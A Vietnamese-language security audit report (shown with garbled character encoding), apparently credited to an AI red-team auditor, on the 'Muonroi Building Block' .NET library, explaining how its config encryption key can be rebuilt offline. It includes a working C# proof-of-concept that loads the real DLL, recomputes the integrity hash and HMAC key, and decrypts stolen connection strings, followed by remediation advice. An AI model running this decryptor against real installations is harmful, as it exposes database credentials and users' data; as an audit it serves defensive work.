# üõ°Ô∏è B√ÅO C√ÅO ƒê√ÅNH GI√Å B·∫¢O M·∫¨T & K·ªäCH B·∫¢N KHAI TH√ÅC (VULNERABILITY ASSESSMENT)

**Target:** Muonroi Building Block Security Architecture
**Date:** 2026-02-07
**Auditor:** Gemini (Red Team Ops)

## 1. T√≥m t·∫Øt ƒëi·ªÅu h√†nh (Executive Summary)

H·ªá th·ªëng b·∫£o m·∫≠t c·ªßa Muonroi Building Block s·ª≠ d·ª•ng m·ªôt ki·∫øn tr√∫c ph·ª©c t·∫°p ("Defense in Depth") v·ªõi c√°c kh√°i ni·ªám ti√™n ti·∫øn nh∆∞ "Functional Entanglement" v√† "Silent Poisoning". Tuy nhi√™n, qua ph√¢n t√≠ch m√£ ngu·ªìn, t√¥i ƒë√£ x√°c ƒë·ªãnh ƒë∆∞·ª£c vector t·∫•n c√¥ng nghi√™m tr·ªçng cho ph√©p **gi·∫£i m√£ to√†n b·ªô d·ªØ li·ªáu nh·∫°y c·∫£m (Connection Strings) ·ªü ch·∫ø ƒë·ªô Offline** m√† kh√¥ng c·∫ßn k√≠ch ho·∫°t ·ª©ng d·ª•ng, kh√¥ng c·∫ßn bypass stack check, v√† kh√¥ng c·∫ßn active license.

L·ªó h·ªïng c·ªët l√µi n·∫±m ·ªü vi·ªác **Dependency Chain c·ªßa Key qu√° tƒ©nh v√† c√≥ th·ªÉ d·ª± ƒëo√°n ƒë∆∞·ª£c (Predictable Key Derivation)**.

## 2. Ph√¢n t√≠ch ƒëi·ªÉm y·∫øu (Vulnerability Analysis)

### ƒêi·ªÉm y·∫øu 1: "The Secret Sauce" (ProjectSeed) n·∫±m l·ªô li·ªÖu
- **C∆° ch·∫ø:** Key gi·∫£i m√£ ph·ª• thu·ªôc v√†o `ProjectSeed`.
- **Th·ª±c t·∫ø:** `ProjectSeed` ƒë∆∞·ª£c l∆∞u plain-text trong `appsettings.json` ho·∫∑c Environment Variable. Attacker c√≥ to√†n quy·ªÅn ƒë·ªçc file n√†y.
- **Location:** `LicenseConfigs.cs` v√† `InfrastructureExtensions.cs` x√°c nh·∫≠n vi·ªác ƒë·ªçc Seed t·ª´ Config.

### ƒêi·ªÉm y·∫øu 2: Integrity Hash l√† Tƒ©nh (Static Integrity Hash)
- **C∆° ch·∫ø:** H·ªá th·ªëng t√≠nh Hash IL c·ªßa method `LicenseGuard.RecordAction` ƒë·ªÉ ƒë·∫£m b·∫£o code kh√¥ng b·ªã s·ª≠a ƒë·ªïi.
- **Th·ª±c t·∫ø:** Attacker kh√¥ng c·∫ßn s·ª≠a ƒë·ªïi code c·ªßa ·ª©ng d·ª•ng g·ªëc. Attacker ch·ªâ c·∫ßn **ƒë·ªçc** file DLL g·ªëc (ho·∫∑c load n√≥ v√†o m·ªôt AppDomain ri√™ng) v√† t√≠nh Hash c·ªßa n√≥. V√¨ file DLL l√† tƒ©nh, Hash IL c≈©ng l√† tƒ©nh.

### ƒêi·ªÉm y·∫øu 3: Logic t√≠nh Key c√≥ th·ªÉ t√°i t·∫°o (Replicable Key Logic)
- **C∆° ch·∫ø:** `FunctionalKey = HMAC(Key: Seed + Hash, Data: RollingToken + Purpose)`
- **Th·ª±c t·∫ø:** To√†n b·ªô thu·∫≠t to√°n n√†y n·∫±m trong m√£ ngu·ªìn C# managed code (`LicenseGuard.DecryptSecurely`). Attacker c√≥ th·ªÉ copy-paste logic n√†y sang m·ªôt Console App ri√™ng ƒë·ªÉ t·∫°o ra key gi·ªëng h·ªát.

## 3. K·ªãch b·∫£n t·∫•n c√¥ng (Exploit Scenario) - "The Shadow Clone"

Thay v√¨ c·ªë g·∫Øng patch IL hay hook v√†o Runtime ƒëang ch·∫°y (n∆°i c√≥ Stack Attestation b·∫£o v·ªá), t√¥i s·∫Ω t·∫°o ra m·ªôt **Shadow Clone** - m·ªôt c√¥ng c·ª• nh·ªè ch·∫°y song song, s·ª≠ d·ª•ng ch√≠nh th∆∞ vi·ªán c·ªßa b·∫°n ƒë·ªÉ ch·ªëng l·∫°i b·∫°n.

### B∆∞·ªõc 1: Thu th·∫≠p nguy√™n li·ªáu
1. Copy file `Muonroi.BuildingBlock.dll` t·ª´ th∆∞ m·ª•c c√†i ƒë·∫∑t c·ªßa n·∫°n nh√¢n.
2. Copy chu·ªói m√£ h√≥a (Connection String) v√† `ProjectSeed` t·ª´ file `appsettings.json`.

### B∆∞·ªõc 2: X√¢y d·ª±ng c√¥ng c·ª• b·∫ª kh√≥a (The KeyGen)
T√¥i vi·∫øt m·ªôt ch∆∞∆°ng tr√¨nh C# ƒë∆°n gi·∫£n th·ª±c hi·ªán c√°c b∆∞·ªõc sau:

```csharp
// POC Code - Shadow Decryptor
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using Muonroi.BuildingBlock.Shared.License; // Reference DLL g·ªëc
using Muonroi.BuildingBlock.External.Extensions; // Reference DLL g·ªëc

public class ShadowDecryptor
{
    public static void Main()
    {
        // 1. Input t·ª´ m√¥i tr∆∞·ªùng n·∫°n nh√¢n
        string targetEncryptedString = "BASE64_CHUOI_MA_HOA_TU_CONFIG";
        string stolenProjectSeed = "SEED_LAY_TU_APPSETTINGS"; 
        
        // 2. T√≠nh to√°n Integrity Hash "x·ªãn" b·∫±ng c√°ch load ch√≠nh DLL th·∫≠t
        // Ch√∫ng ta kh√¥ng s·ª≠a ƒë·ªïi DLL, n√™n Hash s·∫Ω chu·∫©n 100%
        var method = typeof(LicenseGuard).GetMethod("RecordAction");
        var integrityHash = MCryptographyExtension.GetMethodIntegrityHash(method);
        
        Console.WriteLine($"[+] Stolen Seed: {stolenProjectSeed}");
        Console.WriteLine($"[+] Calculated Integrity Hash: {integrityHash}");

        // 3. T√°i t·∫°o logic t·∫°o Key (Replay Attack)
        // L∆∞u √Ω: _rollingToken kh·ªüi t·∫°o l√† "INITIAL_BOOT" n·∫øu ch∆∞a c√≥ Action n√†o
        // N·∫øu ConnectionString ƒë∆∞·ª£c decrypt ngay l√∫c kh·ªüi ƒë·ªông, token th∆∞·ªùng l√† INITIAL_BOOT
        string rollingToken = "INITIAL_BOOT"; 
        string purpose = "db_connection"; // L·∫•y t·ª´ MDbContextConfiguration.cs d√≤ng 122
        
        // Logic copy t·ª´ LicenseGuard.DecryptSecurely
        using var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(stolenProjectSeed + integrityHash));
        var functionalKeyBytes = hmac.ComputeHash(Encoding.UTF8.GetBytes($"{rollingToken}:{purpose}"));
        var functionalKey = Convert.ToHexString(functionalKeyBytes);
        
        Console.WriteLine($"[+] Derived Functional Key: {functionalKey}");

        // 4. Gi·∫£i m√£
        try 
        {
             var plainText = MCryptographyExtension.Decrypt(functionalKey, targetEncryptedString);
             Console.WriteLine($"[SUCCESS] DECRYPTED DATA: {plainText}");
        }
        catch (Exception ex)
        {
             Console.WriteLine($"[FAIL] Decryption failed: {ex.Message}");
             // N·∫øu th·∫•t b·∫°i, c√≥ th·ªÉ RollingToken ƒë√£ thay ƒë·ªïi. 
             // Attacker c√≥ th·ªÉ Brute-force RollingToken d·ª±a tr√™n Timestamp n·∫øu c·∫ßn.
        }
    }
}
```

### B∆∞·ªõc 3: K·∫øt qu·∫£
Attacker c√≥ ƒë∆∞·ª£c Connection String Plaintext. T·ª´ ƒë√≥ truy c·∫≠p tr·ª±c ti·∫øp Database, dump d·ªØ li·ªáu ng∆∞·ªùi d√πng, b·ªè qua ho√†n to√†n m·ªçi t·∫ßng b·∫£o v·ªá c·ªßa ·ª©ng d·ª•ng (Middleware, License Check, Audit Log).

## 4. T·∫°i sao c√°c l·ªõp b·∫£o v·ªá th·∫•t b·∫°i?

| L·ªõp b·∫£o v·ªá | T·∫°i sao th·∫•t b·∫°i? |
|------------|-------------------|
| **RSA Signature** | Kh√¥ng li√™n quan v√¨ ta kh√¥ng gi·∫£ m·∫°o License, ta ch·ªâ gi·∫£i m√£ Config. |
| **Hardware Fingerprint** | Kh√¥ng ƒë∆∞·ª£c d√πng trong qu√° tr√¨nh sinh Key gi·∫£i m√£ config (ch·ªâ d√πng verify license). |
| **Action Chaining** | Connection String th∆∞·ªùng ƒë∆∞·ª£c gi·∫£i m√£ ngay l√∫c kh·ªüi ƒë·ªông (`INITIAL_BOOT`), chu·ªói ch∆∞a k·ªãp ch·∫°y. |
| **Stack Attestation** | C√¥ng c·ª• Shadow Clone l√† m·ªôt process s·∫°ch, kh√¥ng c√≥ Harmony/Cracker tools, Stack Trace h·ª£p l·ªá. |
| **Silent Poisoning** | Ta t√≠nh ƒë√∫ng Key, n√™n kh√¥ng b·ªã Poison. |

## 5. Khuy·∫øn ngh·ªã kh·∫Øc ph·ª•c (Remediation)

Vi·ªác b·∫£o v·ªá code .NET (Managed Code) tr∆∞·ªõc Local Admin/Attacker l√† c·ª±c k·ª≥ kh√≥. Tuy nhi√™n, c√≥ th·ªÉ l√†m kh√≥ h∆°n:

1.  **Obfuscation (L√†m r·ªëi m√£):** S·ª≠ d·ª•ng c√°c c√¥ng c·ª• nh∆∞ .NET Reactor ho·∫∑c ConfuserEx ƒë·ªÉ l√†m r·ªëi logic t√≠nh Key. ƒêi·ªÅu n√†y khi·∫øn vi·ªác copy-paste code sang Shadow Clone kh√≥ khƒÉn h∆°n.
2.  **Native Code Bridge:** Chuy·ªÉn ph·∫ßn logic t√≠nh `MethodIntegrityHash` v√† `HMAC` xu·ªëng m·ªôt th∆∞ vi·ªán C++ (Unmanaged DLL). Vi·ªác Reverse Engineer C++ kh√≥ h∆°n C# r·∫•t nhi·ªÅu.
3.  **Dynamic Seed:** Kh√¥ng l∆∞u Seed trong Config. H√£y fetch Seed t·ª´ Server l√∫c Runtime (Online Only) v√† gi·ªØ trong RAM (SecureString). Tuy nhi√™n ƒëi·ªÅu n√†y l√†m m·∫•t t√≠nh nƒÉng Offline.
4.  **Bind to Hardware earlier:** ƒê∆∞a Hardware ID v√†o c√¥ng th·ª©c sinh Key gi·∫£i m√£ Config. Khi ƒë√≥ Shadow Clone ch·∫°y tr√™n m√°y kh√°c s·∫Ω ra Key sai. (Nh∆∞ng n·∫øu ch·∫°y tr√™n c√πng m√°y n·∫°n nh√¢n th√¨ v·∫´n b·ªã).

---
*End of Report*
